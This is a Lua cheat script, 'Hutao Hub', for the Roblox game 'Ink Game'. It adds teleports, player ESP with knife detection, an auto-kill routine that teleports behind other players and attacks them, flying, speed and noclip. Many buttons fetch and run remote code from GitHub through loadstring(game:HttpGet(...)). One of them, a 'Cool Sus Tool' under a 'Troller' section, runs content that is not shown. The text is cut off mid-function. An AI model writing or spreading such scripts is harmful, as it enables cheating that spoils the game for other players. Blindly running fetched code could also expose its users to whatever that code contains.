--[[

 _   _    _   _   _____     _       ___     _   _   _   _   ____   
| | | |  | | | | |_   _|   / \     / _ \   | | | | | | | | | __ )  
| |_| |  | | | |   | |    / _ \   | | | |  | |_| | | | | | |  _ \  
|  _  |  | | | |   | |   / ___ \  | |_| |  |  _  | | |_| | | |_) | 
\_| |_/   \___/    \_/  /_/   \_\  \___/   \_| |_/  \___/  |____/

                        Hutao Hub
]]

---------------------------------------------------------------------------------

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Fluent/refs/heads/main/SaveManager.lua.txt"))()

local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Fluent/refs/heads/main/InterfaceManager.lua.txt"))()

local minimizeUI = Enum.KeyCode.RightAlt

-- üü¢ Create Main UI
local Window = Fluent:CreateWindow({
    Title = "Hutao Hub [Subcribe!!] | Ink Game",
    SubTitle = "Version 3.0.2",
    TabWidth = 160,
    Size = UDim2.fromOffset(480, 360),
    Acrylic = false,
    Theme = "Darker",
    MinimizeKey = minimizeUI
})

-- Tabs
local Tabs = {
    Dev = Window:AddTab({ Title = "About", Icon = "rbxassetid://121302760641013"}),
    Main = Window:AddTab({ Title = "Main", Icon = "rbxassetid://121302760641013" }),
    Teleport = Window:AddTab({ Title = "Teleport", Icon = "rbxassetid://121302760641013" }),
    Item = Window:AddTab({ Title = "Item", Icon = "rbxassetid://121302760641013" }),
    Player = Window:AddTab({ Title = "Player", Icon = "rbxassetid://121302760641013" }),
    Misc = Window:AddTab({ Title = "Misc", Icon = "rbxassetid://121302760641013" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "rbxassetid://121302760641013" }),
}  

-- Tab.Dev

local Options = Fluent.Options


    Tabs.Dev:AddParagraph({
        Title = "Note",
        Content = "Thank you for using the script!"
    })

    Tabs.Dev:AddSection("‚Ü≥ Links")

    Tabs.Dev:AddButton({
        Title = "Discord",
        Description = "Copy the link to join the discord!",
        Callback = function()
            setclipboard("https://discord.gg/REdfuQTw")
            Fluent:Notify({
                Title = "Notification",
                Content = "Successfully copied to the clipboard",
                SubContent = "", -- Optional
                Duration = 3 
            })
        end
    })



    Tabs.Dev:AddButton({
        Title = "Youtube",
        Description = "Copy link to Subscribe to Youtube channel!",
        Callback = function()
            setclipboard("https://www.youtube.com/@SLKgamingSSR")
            Fluent:Notify({
                Title = "Notification",
                Content = "Successfully copied to the clipboard!",
                SubContent = "", -- Optional
                Duration = 3 
            })
        end
    })


    Tabs.Dev:AddButton({
        Title = "Facebook",
        Description = "Copy link to join facebook group!",
        Callback = function()
            setclipboard("https://www.facebook.com/groups/1180845463307087/?ref=share&mibextid=NSMWBT")
            Fluent:Notify({
                Title = "Notification",
                Content = "Successfully copied to the clipboard!",
                SubContent = "", -- Optional
                Duration = 3 
            })
        end
    })


-- Tabs.Teleport

    Tabs.Teleport:AddSection("‚Ü≥ Player")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local selectedPlayer = nil
local teleporting = false
local playerList = {}

-- Dropdown placeholder, s·∫Ω c·∫≠p nh·∫≠t sau
local dropdown

-- H√†m c·∫≠p nh·∫≠t danh s√°ch player (tr·ª´ ch√≠nh m√¨nh)
local function updatePlayerList()
    playerList = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(playerList, player.Name)
        end
    end

    -- N·∫øu dropdown ƒë√£ t·∫°o th√¨ c·∫≠p nh·∫≠t l·∫°i danh s√°ch
    if dropdown then
        dropdown:SetValues(playerList)
        if #playerList > 0 then
            selectedPlayer = playerList[1]
            dropdown:SetValue(playerList[1])
        else
            selectedPlayer = nil
            dropdown:SetValue("None")
        end
    end
end

-- ‚úÖ C·∫≠p nh·∫≠t danh s√°ch ngay khi m·ªü GUI
updatePlayerList()

-- üîÑ T·ª± ƒë·ªông c·∫≠p nh·∫≠t l·∫°i sau m·ªói 5 ph√∫t
task.spawn(function()
    while true do
        task.wait(300)
        updatePlayerList()
    end
end)

-- T·∫°o Dropdown sau khi c√≥ danh s√°ch player
dropdown = Tabs.Teleport:AddDropdown("PlayerListDropdown", {
    Title = "Select Player",
    Values = playerList,
    Multi = false,
    Default = playerList[1] or "None"
})

dropdown:OnChanged(function(value)
    selectedPlayer = value
end)

-- Toggle b·∫≠t/t·∫Øt teleport li√™n t·ª•c
Tabs.Teleport:AddToggle("AutoTP", {
    Title = "TP to Player",
    Default = false
}):OnChanged(function(enabled)
    teleporting = enabled

    task.spawn(function()
        while teleporting do
            if selectedPlayer then
                local targetPlayer = Players:FindFirstChild(selectedPlayer)
                if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    LocalPlayer.Character:PivotTo(targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)) -- Teleport ph√≠a sau ng∆∞·ªùi ch∆°i
                end
            end
            task.wait(1)
        end
    end)
end)

    Tabs.Teleport:AddSection("‚Ü≥ Games")


Tabs.Teleport:AddButton({
    Title = "TP to Lobby",
    Callback = function()
        pcall(function()
            -- T·∫£i v√† ch·∫°y script t·ª´ link
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Skid/refs/heads/main/TPtoLobby.lua"))()
        end)
    end
})

Tabs.Teleport:AddButton({
    Title = "TP to Red Light",
    Callback = function()
        pcall(function()
            -- T·∫£i v√† ch·∫°y script t·ª´ link
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Skid/refs/heads/main/TPtoRedLight.lua"))()
        end)
    end
})

Tabs.Teleport:AddButton({
    Title = "TP to Dalgona",
    Callback = function()
        pcall(function()
            -- T·∫£i v√† ch·∫°y script t·ª´ link
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Skid/refs/heads/main/TPtoDalgona.lua"))()
        end)
    end
})

Tabs.Teleport:AddButton({
    Title = "TP to Tug of War",
    Callback = function()
        pcall(function()
            -- T·∫£i v√† ch·∫°y script t·ª´ link
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Skid/refs/heads/main/TPtoTugOfWar.lua"))()
        end)
    end
})

Tabs.Teleport:AddButton({
    Title = "TP to Hide & Seek",
    Callback = function()
        pcall(function()
            -- T·∫£i v√† ch·∫°y script t·ª´ link
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Skid/refs/heads/main/TPtoHideAndSeek.lua"))()
        end)
    end
})

Tabs.Teleport:AddButton({
    Title = "TP to Jump Rope",
    Callback = function()
        pcall(function()
            -- T·∫£i v√† ch·∫°y script t·ª´ link
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Skid/refs/heads/main/TPtoJumpRope.lua"))()
        end)
    end
})

Tabs.Teleport:AddButton({
    Title = "TP to Glass Bridge",
    Callback = function()
        pcall(function()
            -- T·∫£i v√† ch·∫°y script t·ª´ link
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Skid/refs/heads/main/TPtoGlassbridge"))()
        end)
    end
})

Tabs.Teleport:AddButton({
    Title = "TP to Mingle",
    Callback = function()
        pcall(function()
            -- T·∫£i v√† ch·∫°y script t·ª´ link
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Skid/refs/heads/main/TPtoMingle.lua"))()
        end)
    end
})

Tabs.Teleport:AddButton({
    Title = "TP to End Game",
    Callback = function()
        pcall(function()
            -- T·∫£i v√† ch·∫°y script t·ª´ link
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/Skid/refs/heads/main/TPtoEndGame.lua"))()
        end)
    end
})







-- Tabs.Item

local AutoCollectBandage = false

-- Ki·ªÉm tra c√≥ Bandage ch∆∞a (ch·ªâ t√≠nh trong backpack)
local function HasBandage()
    local backpack = LocalPlayer:FindFirstChildOfClass("Backpack")
    return backpack and backpack:FindFirstChild("Bandage") ~= nil
end

-- T√¨m model DroppedBandage v√† tr·∫£ v·ªÅ m·ªôt BasePart ƒë·ªÉ teleport
local function FindBandageModel()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name == "DroppedBandage" then
            for _, part in ipairs(obj:GetChildren()) do
                if part:IsA("BasePart") then
                    return part
                end
            end
        end
    end
    return nil
end

-- Toggle GUI
Tabs.Item:AddToggle("AutoCollectBandage", {
    Title = "Auto Collect Bandage",
    Default = false
}):OnChanged(function(Value)
    AutoCollectBandage = Value

    task.spawn(function()
        while AutoCollectBandage do
            task.wait(0.1)

            if HasBandage() then continue end

            local bandagePart = FindBandageModel()
            local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

            if bandagePart and root then
                root.CFrame = bandagePart.CFrame + Vector3.new(0, 2, 0)
                task.wait(0.1) -- ƒê·ª£i ƒë·ªÉ nh·∫∑t
            end
        end
    end)
end)



-- Tabs.Player


-- Gi·∫£ s·ª≠ b·∫°n ƒë√£ c√≥ Fluent GUI, ph·∫ßn n√†y ch·ªâ th√™m Toggle ESP Player

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- ESP Container
local drawings = {}
local espConnection

-- T·∫°o ESP cho Player
local function createESP(player)
    if player == LocalPlayer then return end
    if drawings[player] then return end

    local text = Drawing.new("Text")
    text.Size = 14
    text.Center = true
    text.Outline = true
    text.Visible = false

    drawings[player] = text
end

-- Xo√° ESP
local function removeESP(player)
    if drawings[player] then
        drawings[player]:Remove()
        drawings[player] = nil
    end
end

-- B·∫Øt ƒë·∫ßu ESP
local function startESP()
    for _, player in ipairs(Players:GetPlayers()) do
        createESP(player)
    end

    Players.PlayerAdded:Connect(createESP)
    Players.PlayerRemoving:Connect(removeESP)

    espConnection = RunService.RenderStepped:Connect(function()
        for player, text in pairs(drawings) do
            local character = player.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")

            if hrp and humanoid and humanoid.Health > 0 then
                local pos, visible = Camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, 2.5, 0))
                local distance = (hrp.Position - Camera.CFrame.Position).Magnitude
                text.Text = string.format("%s [%.0fm]", player.Name, distance)

                -- üîÅ Ki·ªÉm tra n·∫øu player c√≥ tool t√™n l√† "Knife"
                local hasKnife = false
                local backpack = player:FindFirstChildOfClass("Backpack")
                local characterTools = character:GetChildren()

                -- Ki·ªÉm tra c·∫£ Backpack v√† tool ƒëang c·∫ßm tr√™n tay
                if backpack and backpack:FindFirstChild("Knife") then
                    hasKnife = true
                else
                    for _, tool in ipairs(characterTools) do
                        if tool:IsA("Tool") and tool.Name == "Knife" then
                            hasKnife = true
                            break
                        end
                    end
                end

                -- üîÅ M√†u: ƒê·ªè n·∫øu c√≥ Knife, xanh n·∫øu kh√¥ng
                if hasKnife then
                    text.Color = Color3.fromRGB(255, 0, 0) -- Red
                else
                    text.Color = Color3.fromRGB(0, 255, 255) -- Cyan
                end

                text.Position = Vector2.new(pos.X, pos.Y)
                text.Visible = visible
            else
                text.Visible = false
            end
        end
    end)
end

-- D·ª´ng ESP
local function stopESP()
    if espConnection then
        espConnection:Disconnect()
        espConnection = nil
    end

    for _, text in pairs(drawings) do
        text:Remove()
    end
    drawings = {}
end

-- ‚úÖ T√≠ch h·ª£p Fluent GUI Toggle trong Tabs.Player
Tabs.Player:AddToggle("ESPPlayerToggle", {
    Title = "ESP Player",
    Default = false,
}):OnChanged(function(enabled)
    if enabled then
        startESP()
    else
        stopESP()
    end
end)





-- Auto Kill V2

--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualInput = game:GetService("VirtualInputManager")
local RunService = game:GetService("RunService")

--// Bi·∫øn ƒëi·ªÅu khi·ªÉn
local AutoAttack = false
local LastTarget = nil
local hasActivatedOnStart = false
local PreferWeak = true
local AutoHeal = true
local wasHealing = false
local healFloatY = nil

--// Player VIP
local VipPlayers = {
    ["Hu1a0_Hu9"] = true,
    ["SudonButbad"] = true
}

--// Tools
local activationTools = { "Power Hold", "Push", "Pocket Sand", "Trip" }
local weaponTools = { "Fists", "Knife", "Fork", "Bottle" }
local healTools = {
    "Bandage", "Kimbap", "Onigiri", "Soda",
    "Umbrella Cookie", "Star Cookie", "Triangle Cookie",
    "Circle Cookie", "MonaLisa Cookie", "SackBoy Cookie"
}

--// T√¨m tool
local function FindTool(name)
    local backpack = LocalPlayer:FindFirstChildOfClass("Backpack")
    local char = LocalPlayer.Character
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") and tool.Name == name then return tool end
        end
    end
    if char then
        for _, tool in ipairs(char:GetChildren()) do
            if tool:IsA("Tool") and tool.Name == name then return tool end
        end
    end
    return nil
end

--// Equip tool
local function EquipTool(toolName)
    local tool = FindTool(toolName)
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if tool and humanoid then
        humanoid:EquipTool(tool)
        return true
    end
    return false
end

--// Equip v≈© kh√≠ ch√≠nh n·∫øu ch∆∞a c·∫ßm
local function EnsureWeaponEquipped()
    local char = LocalPlayer.Character
    if not char then return end
    for _, toolName in ipairs(weaponTools) do
        local tool = FindTool(toolName)
        if tool and tool.Parent == char then return end
    end
    for _, toolName in ipairs(weaponTools) do
        if EquipTool(toolName) then break end
    end
end

--// D√πng tool k√≠ch ho·∫°t
local function UseActivationTool()
    for _, toolName in ipairs(activationTools) do
        if EquipTool(toolName) then
            task.wait(0.05)
            VirtualInput:SendMouseButtonEvent(0, 0, 0, true, game, 0)
            task.wait(0.02)
            VirtualInput:SendMouseButtonEvent(0, 0, 0, false, game, 0)
            return
        end
    end
end

--// Ki·ªÉm tra c√≥ c·∫ßm Tool c·ª• th·ªÉ kh√¥ng
local function HasToolEquipped(toolName)
    local char = LocalPlayer.Character
    if not char then return false end
    local tool = char:FindFirstChildOfClass("Tool")
    return tool and tool.Name == toolName
end

--// H·ªìi m√°u n·∫øu y·∫øu
local function TryHeal()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid then return false end
    if wasHealing then return true end
    wasHealing = true

    if AutoAttack and not healFloatY then
        healFloatY = root.Position.Y + 50
    end

    local floatConn
    floatConn = RunService.Heartbeat:Connect(function()
        if not AutoHeal or not wasHealing then
            floatConn:Disconnect()
            return
        end
        if healFloatY then
            local pos = root.Position
            root.CFrame = CFrame.new(Vector3.new(pos.X, healFloatY, pos.Z))
        end
    end)

    while humanoid.Health <= 45 and AutoHeal do
        local used = false
        for _, toolName in ipairs(healTools) do
            local tool = FindTool(toolName)
            if tool then
                EquipTool(toolName)
                task.wait(0.05)
                VirtualInput:SendMouseButtonEvent(0, 0, 0, true, game, 0)
                task.wait(0.02)
                VirtualInput:SendMouseButtonEvent(0, 0, 0, false, game, 0)
                task.wait(1.5) -- gi·∫£m delay h·ªìi m√°u
                used = true
                break
            end
        end
        if not used then break end
    end

    task.delay(0.1, function()
        wasHealing = false
        healFloatY = nil
        if AutoAttack then
            EnsureWeaponEquipped()
        end
    end)

    return true
end

--// T√¨m target
local function GetTargetPlayer()
    local char = LocalPlayer.Character
    local myPos = char and char:FindFirstChild("HumanoidRootPart") and char.HumanoidRootPart.Position
    if not myPos then return nil end

    local hasKnifeEquipped = HasToolEquipped("Knife")

    local candidates = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and not VipPlayers[player.Name] then
            local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
            local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            if humanoid and humanoid.Health > 0 and root then
                local hasKnife = false
                for _, tool in ipairs(player.Character:GetChildren()) do
                    if tool:IsA("Tool") and tool.Name == "Knife" then
                        hasKnife = true
                        break
                    end
                end
                if not hasKnifeEquipped or (hasKnifeEquipped and not hasKnife) then
                    table.insert(candidates, {
                        Player = player,
                        Health = humanoid.Health,
                        Distance = (root.Position - myPos).Magnitude
                    })
                end
            end
        end
    end

    table.sort(candidates, function(a, b)
        if PreferWeak then
            return a.Health == b.Health and a.Distance < b.Distance or a.Health < b.Health
        else
            return a.Distance < b.Distance
        end
    end)

    return candidates[1] and candidates[1].Player
end

--// Toggle AutoAttack
Tabs.Player:AddToggle("AutoAttackToggle", {
    Title = "Auto Kill Player",
    Default = false
}):OnChanged(function(Value)
    AutoAttack = Value
    LastTarget = nil
    hasActivatedOnStart = false

    task.spawn(function()
        while AutoAttack do
            local char = LocalPlayer.Character
            local humanoid = char and char:FindFirstChildOfClass("Humanoid")
            if not humanoid then task.wait(0.05) continue end

            if AutoHeal and humanoid.Health <= 45 then
                TryHeal()
                repeat task.wait(0.05) until humanoid.Health > 45 or not AutoAttack
            end

            if wasHealing then task.wait(0.02) continue end

            local Target = GetTargetPlayer()
            if not Target then task.wait(0.02) continue end

            local root = char:FindFirstChild("HumanoidRootPart")
            local targetRoot = Target.Character and Target.Character:FindFirstChild("HumanoidRootPart")
            if not root or not targetRoot then continue end

            if not hasActivatedOnStart or Target ~= LastTarget then
                hasActivatedOnStart = true
                LastTarget = Target
                UseActivationTool()
                EnsureWeaponEquipped()
            end

            local direction = targetRoot.CFrame.LookVector.Unit
            local offset = direction * -2.5
            local targetPos = targetRoot.Position + offset

            root.CFrame = CFrame.new(targetPos, targetRoot.Position + direction * 5)

            VirtualInput:SendMouseButtonEvent(0, 0, 0, true, game, 0)
            task.wait(0.01)
            VirtualInput:SendMouseButtonEvent(0, 0, 0, false, game, 0)

            task.wait(0.05) -- teleport nhanh h∆°n
        end
    end)
end)

--// Toggle ∆∞u ti√™n m√°u y·∫øu
Tabs.Player:AddToggle("PreferWeakToggle", {
    Title = "Prefer Low Health",
    Default = true
}):OnChanged(function(Value)
    PreferWeak = Value
end)

--// Toggle Auto Heal
Tabs.Player:AddToggle("AutoHealToggle", {
    Title = "Auto Heal (45 HP)",
    Default = true
}):OnChanged(function(Value)
    AutoHeal = Value
end)

-- AutoHeal ho·∫°t ƒë·ªông ri√™ng n·∫øu kh√¥ng b·∫≠t AutoAttack
task.spawn(function()
    while true do
        task.wait(0.1) -- tƒÉng t·ªëc check m√°u
        if AutoHeal and not AutoAttack then
            local char = LocalPlayer.Character
            local humanoid = char and char:FindFirstChildOfClass("Humanoid")
            if humanoid and humanoid.Health <= 45 then
                TryHeal()
            end
        end
    end
end)





    Tabs.Player:AddSection("‚Ü≥ Flying")

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- State
local flying = false
local flySpeed = 50
local bodyVelocity, bodyGyro, renderConn

-- Function: Start Flying
local function startFlying()
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local HRP = character:WaitForChild("HumanoidRootPart")

	local seat = humanoid.SeatPart
	local attachPart = seat or HRP

	-- Body movers
	bodyVelocity = Instance.new("BodyVelocity")
	bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
	bodyVelocity.Velocity = Vector3.zero
	bodyVelocity.Parent = attachPart

	bodyGyro = Instance.new("BodyGyro")
	bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
	bodyGyro.CFrame = attachPart.CFrame
	bodyGyro.Parent = attachPart

	humanoid:ChangeState(Enum.HumanoidStateType.Physics)

	-- Movement logic
	renderConn = RunService.RenderStepped:Connect(function()
		if attachPart and Camera then
			local camCF = Camera.CFrame
			local moveDir = humanoid.MoveDirection

			local moveVec = Vector3.zero

			if moveDir.Magnitude > 0 then
				-- D·ª±ng vector bay theo h∆∞·ªõng nh√¨n
				local forward = camCF.LookVector
				local flatForward = Vector3.new(forward.X, 0, forward.Z).Unit
				local verticalInfluence = forward.Unit.Y

				-- X√°c ƒë·ªãnh xem ƒëang ƒëi ti·∫øn hay l√πi
				local movingForward = flatForward:Dot(moveDir.Unit) > 0.1
				local movingBackward = flatForward:Dot(moveDir.Unit) < -0.1

				local yVelocity = 0

				-- N·∫øu ƒëang ƒëi ti·∫øn ho·∫∑c l√πi, √°p d·ª•ng h∆∞·ªõng nh√¨n ƒë·ªÉ tƒÉng gi·∫£m ƒë·ªô cao
				if movingForward then
					yVelocity = verticalInfluence
				elseif movingBackward then
					yVelocity = -verticalInfluence
				end

				-- K·∫øt h·ª£p chuy·ªÉn ƒë·ªông ngang + d·ªçc
				moveVec = Vector3.new(moveDir.X, yVelocity, moveDir.Z).Unit
			end

			bodyVelocity.Velocity = moveVec * flySpeed
			bodyGyro.CFrame = camCF
		end
	end)

	flying = true
end

-- Function: Stop Flying
local function stopFlying()
	flying = false

	if renderConn then renderConn:Disconnect() renderConn = nil end
	if bodyVelocity then bodyVelocity:Destroy() bodyVelocity = nil end
	if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end

	-- Fix: Kh√¥i ph·ª•c tr·∫°ng th√°i nh√¢n v·∫≠t
	local character = player.Character
	if character then
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
		end
	end
end

-- Auto handle respawn
Players.LocalPlayer.CharacterAdded:Connect(function()
	if flying then
		task.wait(1)
		startFlying()
	end
end)

-- UI Toggle
local FlyToggle = Tabs.Player:AddToggle("FlyToggle", {
	Title = "Fly (Mobile + PC)",
	Description = "Fly Supper OP For Newbie!",
	Default = false
})

FlyToggle:OnChanged(function(Value)
	if Value then
		startFlying()
	else
		stopFlying()
	end
end)

-- Speed slider
Tabs.Player:AddSlider("FlySpeedSlider", {
	Title = "Fly Speed",
	Description = "Adjust fly speed",
	Default = 50,
	Min = 10,
	Max = 300,
	Rounding = 0,
	Callback = function(Value)
		flySpeed = Value
	end
})


    Tabs.Player:AddSection("‚Ü≥ Walk Speed")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local speedValue = 16 -- M·∫∑c ƒë·ªãnh
local running = false

-- T·∫°o Slider t·ªëc ƒë·ªô trong Tabs.Player
local speedSlider = Tabs.Player:AddSlider("SpeedSlider", {
    Title = "Adjust speed",
    Default = 16,
    Min = 1,
    Max = 300,
    Rounding = 0,
})

-- L·∫Øng nghe khi Slider thay ƒë·ªïi
speedSlider:OnChanged(function(value)
    speedValue = value
end)

-- T·∫°o Toggle tƒÉng t·ªëc ƒë·ªô li√™n t·ª•c
local speedToggle = Tabs.Player:AddToggle("SpeedToggle", {
    Title = "Walk Speed",
    Default = false,
})

-- L·∫Øng nghe khi Toggle thay ƒë·ªïi
speedToggle:OnChanged(function(enabled)
    running = enabled

    if enabled then
        -- Lu·ªìng ch·∫°y li√™n t·ª•c tƒÉng t·ªëc
        task.spawn(function()
            while running and task.wait(0.1) do
                local character = LocalPlayer.Character
                if character then
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.WalkSpeed = speedValue
                    end
                end
            end
        end)
    else
        -- Khi t·∫Øt: tr·∫£ v·ªÅ t·ªëc ƒë·ªô m·∫∑c ƒë·ªãnh
        local character = LocalPlayer.Character
        if character then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = 16
            end
        end
    end
end)


    Tabs.Player:AddSection("‚Ü≥ Noclip")


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local Maid = {} -- Gi·∫£ l·∫≠p Maid n·∫øu b·∫°n ch∆∞a c√≥
Maid.__index = Maid

function Maid.new()
    return setmetatable({_tasks = {}}, Maid)
end

function Maid:GiveTask(task)
    table.insert(self._tasks, task)
end

function Maid:DoCleaning()
    for _, task in ipairs(self._tasks) do
        if typeof(task) == "RBXScriptConnection" then
            task:Disconnect()
        elseif typeof(task) == "function" then
            task()
        end
    end
    self._tasks = {}
end

-- T·∫°o Toggle Noclip
local noclipToggle = Tabs.Player:AddToggle("NoclipToggle", {
    Title = "Noclip Pro",
    Default = false,
})

-- Setup h·ªá th·ªëng Noclip
local CharacterMaid = Maid.new()
local NoclippedBaseParts = {}
local CachedBaseParts = {}

local function OnCharacterAdded(character)
    CharacterMaid:DoCleaning()
    CachedBaseParts = {}
    local humanoid = character:WaitForChild("Humanoid")

    -- Cache t·∫•t c·∫£ BasePart
    for _, obj in ipairs(character:GetDescendants()) do
        if obj:IsA("BasePart") then
            table.insert(CachedBaseParts, obj)
        end
    end

    -- Cache m·ªõi n·∫øu c√≥ BasePart m·ªõi
    CharacterMaid:GiveTask(character.DescendantAdded:Connect(function(desc)
        if desc:IsA("BasePart") then
            table.insert(CachedBaseParts, desc)
        end
    end))

    -- V√≤ng l·∫∑p ch√≠nh cho Noclip
    CharacterMaid:GiveTask(RunService.Stepped:Connect(function()
        if not noclipToggle.Value then
            for part in pairs(NoclippedBaseParts) do
                NoclippedBaseParts[part] = nil
                part.CanCollide = true
            end
            return
        end

        for _, part in ipairs(CachedBaseParts) do
            if part:IsA("BasePart") and part.CanCollide then
                NoclippedBaseParts[part] = true
                part.CanCollide = false
            end
        end
    end))

    -- Khi character b·ªã x√≥a, kh√¥i ph·ª•c CanCollide
    CharacterMaid:GiveTask(function()
        for part in pairs(NoclippedBaseParts) do
            part.CanCollide = true
        end
        NoclippedBaseParts = {}
    end)
end

-- G·∫Øn v√†o nh√¢n v·∫≠t m·ªõi
LocalPlayer.CharacterAdded:Connect(OnCharacterAdded)
if LocalPlayer.Character then
    task.spawn(OnCharacterAdded, LocalPlayer.Character)
end



    Tabs.Player:AddSection("‚Ü≥ Troller")

Tabs.Player:AddButton({
    Title = "Cool Sus Tool",
    Callback = function()
        pcall(function()
            -- T·∫£i v√† ch·∫°y script t·ª´ link
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SLK-gaming/OMG/refs/heads/main/Sus.txt"))()
        end)
    end
})


-- Tabs.Misc

local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")

-- ‚úÖ FullBright Settings
local fullBrightEnabled = false
local fullBrightLoop

local function applyFullBright()
    if not fullBrightEnabled then return end

    Lighting.Ambient = Color3.fromRGB(200, 200, 200) -- s√°ng nh·∫π
    Lighting.Brightness = 4 -- gi·∫£m ƒë·ªô s√°ng t·ª´ 10 ‚Üí 4
    Lighting.GlobalShadows = false
end

local function enableFullBright()
    if fullBrightLoop then fullBrightLoop:Disconnect() end
    applyFullBright()
    fullBrightLoop = Lighting:GetPropertyChangedSignal("ClockTime"):Connect(applyFullBright)
end

local function disableFullBright()
    if fullBrightLoop then
        fullBrightLoop:Disconnect()
        fullBrightLoop = nil
    end

    Lighting.Ambient = Color3.fromRGB(128, 128, 128)
    Lighting.Brightness = 1
    Lighting.GlobalShadows = true
end

-- ‚úÖ Toggle: FullBright
local FbToggle = Tabs.Misc:AddToggle("FbToggle", {
    Title = "Auto Full Bright",
    Default = false
})
FbToggle:OnChanged(function(Value)
    fullBrightEnabled = Value
    if fullBrightEnabled then
        enableFullBright()
    else
        disableFullBright()
    end
end)

-- ‚úÖ Remove Fog Settings
local fogEnabled = false
local fogLoop

local function removeFog()
    Lighting.FogStart = 0
    Lighting.FogEnd = 1000000

    local atmosphere = Lighting:FindFirstChild("Atmosphere")
    if atmosphere then
        atmosphere.Density = 0
        atmosphere.Offset = 0
        atmosphere.Haze = 0
        atmosphere.Color = Color3.new(1, 1, 1)
    end
end

local function restoreFog()
    Lighting.FogStart = 200
    Lighting.FogEnd = 1000

    local atmosphere = Lighting:FindFirstChild("Atmosphere")
    if atmosphere then
        atmosphere.Density = 0.3
        atmosphere.Offset = 0
        atmosphere.Haze = 0.5
        atmosphere.Color = Color3.fromRGB(200, 200, 200)
    end
end

-- ‚úÖ Toggle: Remove Fog
local FogToggle = Tabs.Misc:AddToggle("FogToggle", {
    Title = "Remove Fog",
    Default = false
})
FogToggle:OnChanged(function(Value)
    fogEnabled = Value
    if fogEnabled then
        removeFog()
        fogLoop = RunService.Heartbeat:Connect(removeFog)
    else
        if fogLoop then fogLoop:Disconnect() fogLoop = nil end
        restoreFog()
    end
end)


    Tabs.Misc:AddSection("‚Ü≥ Visual")

-- FPS + Ping Drawing Setup
local showFPS = true
local showPing = true

local fpsText = Drawing.new("Text")
fpsText.Size = 16
fpsText.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X - 100, 10)
fpsText.Color = Color3.fromRGB(0, 255, 0)
fpsText.Center = false
fpsText.Outline = true
fpsText.Visible = showFPS

local msText = Drawing.new("Text")
msText.Size = 16
msText.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X - 100, 30)
msText.Color = Color3.fromRGB(0, 255, 0)
msText.Center = false
msText.Outline = true
msText.Visible = showPing

local fpsCounter = 0
local fpsLastUpdate = tick()

RunService.RenderStepped:Connect(function()
    fpsCounter += 1
    if tick() - fpsLastUpdate >= 1 then
        -- Update FPS
        if showFPS then
            fpsText.Text = "FPS: " .. tostring(fpsCounter)
            fpsText.Visible = true
        else
            fpsText.Visible = false
        end

        -- Update Ping
        if showPing then
            local pingStat = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]
            local ping = pingStat and math.floor(pingStat:GetValue()) or 0
            msText.Text = "Ping: " .. ping .. " ms"

            if ping <= 60 then
                msText.Color = Color3.fromRGB(0, 255, 0)
            elseif ping <= 120 then
                msText.Color = Color3.fromRGB(255, 165, 0)
            else
                msText.Color = Color3.fromRGB(255, 0, 0)
            end

            msText.Visible = true
        else
            msText.Visible = false
